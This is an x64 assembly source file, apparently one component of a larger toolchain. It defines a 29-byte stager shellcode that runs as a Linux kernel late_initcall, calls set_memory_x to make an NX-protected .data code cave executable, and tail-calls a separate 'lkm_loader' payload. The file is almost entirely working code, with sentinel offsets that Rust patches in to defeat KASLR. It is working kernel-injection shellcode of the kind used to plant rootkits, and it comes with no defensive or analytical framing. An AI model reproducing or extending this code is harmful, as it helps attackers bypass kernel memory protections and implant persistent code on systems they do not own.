; lkm_stager.asm
; Minimal 29-byte x64 stager executed as a Linux kernel late_initcall.
;
; Problem: the main lkm_loader shellcode lives in a .data code cave that has
; its NX bit set by the kernel before late_initcall runs. This stager lives in
; .text (always executable), calls set_memory_x to make the .data page
; executable, then tail-calls lkm_loader.
;
; All addresses are encoded as PC-relative rel32/disp32 offsets — no absolute
; pointers — making this blob KASLR-safe. The .data cave address is derived at
; runtime via RIP-relative LEA followed by page-alignment masking.
;
; Assemble (flat binary):
;   nasm -f bin -o lkm_stager.bin lkm_stager.asm
;
; Blob layout (29 bytes, offsets from blob start):
;   [0]   55                   push rbp
;   [1]   48 8D 3D xx xx xx xx lea rdi, [rip + CAVE_PAGE_DISP_SENTINEL]
;   [8]   48 81 E7 00 F0 FF FF and rdi, -4096          (page-align cave addr)
;   [15]  6A 01                push 1
;   [17]  5E                   pop rsi
;   [18]  E8 xx xx xx xx       call SET_MEMORY_X_REL_SENTINEL
;   [23]  5D                   pop rbp
;   [24]  E9 xx xx xx xx       jmp LOADER_JMP_REL_SENTINEL
;
; Sentinels (patched as i32 PC-relative offsets by Rust before writing blob):
;   CAVE_PAGE_DISP_SENTINEL   0x11223344  bytes [4..8]    disp32 in lea rdi,[rip+d]
;                                                          → runtime addr of loader cave
;   SET_MEMORY_X_REL_SENTINEL 0x55667788  bytes [19..23]  rel32 for call set_memory_x
;   LOADER_JMP_REL_SENTINEL   0x99AABBCC  bytes [25..29]  rel32 for jmp lkm_loader

BITS 64

; ── Calling convention ───────────────────────────────────────────────────────
; On entry (late_initcall):  rsp % 16 == 8  (caller ret addr on stack)
; After push rbp:            rsp % 16 == 0  (aligned for call)
; After pop rbp:             rsp % 16 == 8  (ready for tail-call)

lkm_stager:
    push    rbp                         ; 55          [1]  align rsp for call

    ; Load the runtime address of the loader cave via RIP-relative LEA.
    ; disp32 is patched by Rust: loader_cave_virt - (stager_cave_virt + 8)
    db      0x48, 0x8D, 0x3D           ; REX.W LEA rdi, [rip + disp32]   [3]
    dd      0x11223344                  ; CAVE_PAGE_DISP_SENTINEL          [4]
    ; rip now points here (stager_cave_virt + 8); rdi = loader_cave_virt

    and     rdi, -4096                  ; 48 81 E7 00 F0 FF FF  [7]  page-align

    push    1                           ; 6A 01       [2]  arg2: nrpages = 1
    pop     rsi                         ; 5E          [1]

    ; Call set_memory_x(loader_cave_page, 1) — direct rel32.
    ; rel32 is patched by Rust: set_memory_x_virt - (stager_cave_virt + 23)
    db      0xE8                        ; CALL rel32                       [1]
    dd      0x55667788                  ; SET_MEMORY_X_REL_SENTINEL        [4]

    pop     rbp                         ; 5D          [1]  restore frame pointer

    ; Tail-call lkm_loader — direct rel32 jmp.
    ; rel32 is patched by Rust: loader_cave_virt - (stager_cave_virt + 29)
    db      0xE9                        ; JMP rel32                        [1]
    dd      0x99AABBCC                  ; LOADER_JMP_REL_SENTINEL          [4]
                                        ; ─────────────────────────────────────
                                        ; Total bytes: 1+7+7+2+1+5+1+5 = 29
